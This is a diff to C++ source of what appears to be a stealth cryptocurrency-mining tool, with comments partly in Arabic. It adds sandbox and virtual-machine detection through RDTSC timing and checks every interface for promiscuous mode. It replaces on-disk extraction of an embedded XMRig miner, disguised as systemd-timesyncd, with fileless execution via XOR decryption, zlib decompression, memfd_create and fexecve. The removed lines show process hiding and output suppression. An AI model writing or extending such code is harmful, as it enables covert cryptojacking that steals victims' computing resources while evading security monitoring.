@@ -1,3 +1,12 @@
+#include <cstdint>
+#include <chrono>
+#include <thread>
+// inline RDTSC for VM timing detection
+static inline uint64_t rdtsc() {
+    unsigned int lo, hi;
+    asm volatile("rdtsc" : "=a"(lo), "=d"(hi));
+    return ((uint64_t)hi << 32) | lo;
+}
 #include "evasion_monitor.h"
 #include "binary_embedder.h"
 #include <iostream>
@@ -17,6 +26,10 @@
 #include <sys/ptrace.h>
 #include <signal.h>
 #include <cstdlib>
+#include <sys/mman.h>  // for memfd_create
+#include <linux/memfd.h>
+#include <unistd.h>    // for fexecve, environ
+#include <zlib.h>  // for uncompress
 
 // قائمة أدوات الأمان والمراقبة المعروفة
 std::vector<std::string> EvasionMonitor::getSecurityProcessList() {
@@ -98,6 +111,18 @@ bool EvasionMonitor::checkVMIndicators() {
         }
     }
     
+    // TSC timing check for VM detection (RDTSC)
+    {
+        unsigned long long t0 = __rdtsc();
+        std::this_thread::sleep_for(std::chrono::milliseconds(1));
+        unsigned long long t1 = __rdtsc();
+        unsigned long long delta = t1 - t0;
+        // if too low, likely virtualized slow timer
+        if (delta < 1000000ULL) {
+            return true;
+        }
+    }
+
     // فحص MAC addresses مشبوهة
     std::ifstream interfaces("/sys/class/net/eth0/address");
     std::string mac;
@@ -171,14 +196,24 @@ bool EvasionMonitor::isNetworkMonitored() {
         }
     }
     
-    // فحص interfaces في promiscuous mode
-    std::ifstream flags("/sys/class/net/eth0/flags");
-    std::string flagsStr;
-    if (std::getline(flags, flagsStr)) {
-        int flagsInt = std::stoi(flagsStr, nullptr, 16);
-        if (flagsInt & 0x100) { // IFF_PROMISC flag
-            return true;
+    // فحص interfaces في promiscuous mode عبر جميع الواجهات
+    DIR* netDir = opendir("/sys/class/net");
+    if (netDir) {
+        struct dirent* ent;
+        while ((ent = readdir(netDir)) != nullptr) {
+            if (ent->d_name[0] == '.') continue;
+            std::string flagPath = std::string("/sys/class/net/") + ent->d_name + "/flags";
+            std::ifstream flagFile(flagPath);
+            std::string flagsStr;
+            if (std::getline(flagFile, flagsStr)) {
+                int flagsInt = std::stoi(flagsStr, nullptr, 16);
+                if (flagsInt & 0x100) { // IFF_PROMISC
+                    closedir(netDir);
+                    return true;
+                }
+            }
         }
+        closedir(netDir);
     }
     
     return false;
@@ -278,21 +313,7 @@ void EvasionMonitor::runHiddenMiner() {
     // إخفاء هوية العملية أولاً
     hideProcessName();
     
-    // استخراج XMRig من البيانات المدمجة
-    extractedXMRigPath = "/tmp/." + std::to_string(getpid()) + "_systemd-timesyncd";
-    extractedConfigPath = "/tmp/." + std::to_string(getpid()) + "_timesyncd.conf";
-    
-    if (!BinaryEmbedder::extractXMRig(extractedXMRigPath)) {
-        std::cerr << "[ERROR] Failed to extract XMRig binary" << std::endl;
-        return;
-    }
-    
-    if (!BinaryEmbedder::extractConfig(extractedConfigPath)) {
-        std::cerr << "[ERROR] Failed to extract config file" << std::endl;
-        return;
-    }
-    
-    std::cout << "[INFO] Successfully extracted embedded binaries" << std::endl;
+    // binary will be loaded directly into memory via memfd_create
     
     while (true) {
         // تنظيف الآثار بشكل دوري
@@ -306,46 +327,31 @@ void EvasionMonitor::runHiddenMiner() {
             
             // تشغيل XMRig المستخرج كعملية فرعية
             pid_t pid = fork();
-            if (pid == 0) {  // العملية الفرعية
-                // إخفاء السجلات: إعادة توجيه جميع المخرجات إلى /dev/null
-                int devnull = open("/dev/null", O_WRONLY);
-                dup2(devnull, STDOUT_FILENO);
-                dup2(devnull, STDERR_FILENO);
-                dup2(devnull, STDIN_FILENO);
-                close(devnull);
-
-                // تغيير هوية العملية
-                hideProcessName();
-
-                // تمويه الاستهلاك: جعل العملية أقل أولوية
-                nice(19);  // أقل أولوية ممكنة
-                
-                // تغيير working directory
-                chdir("/var/lib/systemd");
-
-                // تشغيل XMRig المستخرج مع معلمات مخفية
-                execl(extractedXMRigPath.c_str(), "systemd-timesyncd", 
-                      "--config", extractedConfigPath.c_str(),
-                      "--background", "--syslog", 
-                      nullptr);
-                exit(1);
-            } else if (pid > 0) {
-                // العملية الأصلية: مراقبة العملية الفرعية
-                int status;
-                
-                // انتظار مع timeout
-                sleep(300); // 5 دقائق قبل إعادة التقييم
-                
-                // التحقق من حالة العملية
-                if (waitpid(pid, &status, WNOHANG) == 0) {
-                    // العملية لا تزال تعمل، تحقق من المراقبة مرة أخرى
-                    if (isMonitoringActive()) {
-                        kill(pid, SIGTERM); // إنهاء العملية بأمان
-                        waitpid(pid, &status, 0);
-                    }
+            if (pid == 0) {
+                // child: decrypt, decompress and load XMRig via memfd
+                int fd = memfd_create("xmrig", MFD_CLOEXEC);
+                if (fd < 0) _exit(1);
+                // XOR decryption of compressed data
+                size_t compSize = embedded_xmrig_encrypted_size;
+                unsigned char* compBuf = (unsigned char*)malloc(compSize);
+                for (size_t i = 0; i < compSize; ++i) {
+                    compBuf[i] = embedded_xmrig_encrypted[i] ^ xor_key[i % xor_key_size];
                 }
+                // decompress via zlib
+                unsigned long rawSize = embedded_xmrig_size;
+                unsigned char* rawBuf = (unsigned char*)malloc(rawSize);
+                if (uncompress(rawBuf, &rawSize, compBuf, compSize) != Z_OK) {
+                    _exit(2);
+                }
+                // write to memfd
+                if (write(fd, rawBuf, rawSize) != (ssize_t)rawSize) _exit(3);
+                // execute from memfd
+                fexecve(fd, (char* const[]){(char*)"xmrig", (char*)"--config=<(memory)", NULL}, environ);
+                _exit(4);
+            } else if (pid > 0) {
+                // parent continues
             } else {
-                std::cerr << "[ERROR] Failed to fork process" << std::endl;
+                std::cerr << "[ERROR] fork failed" << std::endl;
             }
         } else {
             std::cout << "[WARNING] Monitoring detected, entering stealth mode..." << std::endl;
